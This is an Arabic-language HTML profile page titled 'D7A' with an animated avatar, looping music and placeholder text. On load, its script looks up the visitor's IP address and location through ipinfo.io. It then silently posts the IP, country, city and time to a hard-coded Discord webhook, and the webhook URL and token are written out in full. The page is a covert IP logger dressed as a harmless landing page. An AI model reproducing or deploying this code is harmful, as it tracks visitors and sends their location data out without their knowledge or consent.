<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>D7A</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Tiny5&display=swap" rel="stylesheet">

<style>
html, body {
    height: 100%;
    margin: 0;
    font-family: 'Tiny5', Arial, sans-serif;
    background-color: #000;
    color: #fff;
    overflow: hidden;
    position: relative;
}

body::before {
    content: "";
    position: fixed;
    inset: 0;
    background: linear-gradient(180deg, rgb(0,0,0), rgb(5,5,5));
    pointer-events: none;
    z-index: -1;
    opacity: 0;
    animation: fadeInBg 2s forwards;
}

@keyframes fadeInBg {
    from {opacity: 0;}
    to {opacity: 1;}
}

.center-text {
    font-size: 100px;
    color: #fff;
    opacity: 0;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    transition: opacity 1s ease;
}

.container {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
}

.image-container, .title, .description, .ip-address {
    opacity: 0;
    transition: opacity 1s ease;
}

.image-container img {
    width: 312px;
    height: 312px;
    border-radius: 20px;
    object-fit: cover;
}

.title { font-size: 24px; margin-top: 12px; }
.description { font-size: 16px; margin-top: 6px; }
.ip-address { font-size: 14px; margin-top: 4px; font-family: monospace; }
</style>
</head>
<body>

<div class="center-text">D7A</div>

<div class="container">
    <div class="image-container">
        <img src="https://i.pinimg.com/originals/2f/d6/df/2fd6df147fcb28699d340a6cf34958a3.gif" alt="Avatar">
    </div>
    <div class="title">عنوان الصفحة</div>
    <div class="description">هذا وصف للزائر</div>
    <div class="ip-address" id="ip-info">IP: </div>
</div>

<audio id="myAudio" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" loop></audio>

<script>
const audio = document.getElementById('myAudio');
let played = false;

document.addEventListener('click', () => {
    if (!played) {
        audio.play().catch(() => {});
        played = true;
    }
});

const centerText = document.querySelector('.center-text');
const imageContainer = document.querySelector('.image-container');
const title = document.querySelector('.title');
const description = document.querySelector('.description');
const ipAddress = document.getElementById('ip-info');

setTimeout(() => {
    centerText.style.opacity = 1;
    setTimeout(() => {
        centerText.style.opacity = 0;
        setTimeout(() => {
            centerText.style.display = 'none';
            imageContainer.style.opacity = 1;
            setTimeout(() => { title.style.opacity = 1; }, 500);
            setTimeout(() => { description.style.opacity = 1; }, 1000);

            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .then(data => {
                    const { ip, country, city, region, loc, org, timezone } = data;
                    ipAddress.textContent = `IP: ${ip} - ${country}, ${city}`;
                    ipAddress.style.opacity = 1;

                    const dateTime = new Date().toLocaleString();
                    const webhookUrl = 'https://canary.discord.com/api/webhooks/1422277048143183923/ehz4DwhL8WXZO_dXDGwunLJWXeVysQ8Jw0lVnlu4VzH7iBXVfPlmARohOKIOjtIWeMUn';
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
                        })
                    });
                });
            // --- نهاية الكود ---
        }, 1000);
    }, 2000);
}, 500);
</script>

</body>
</html>
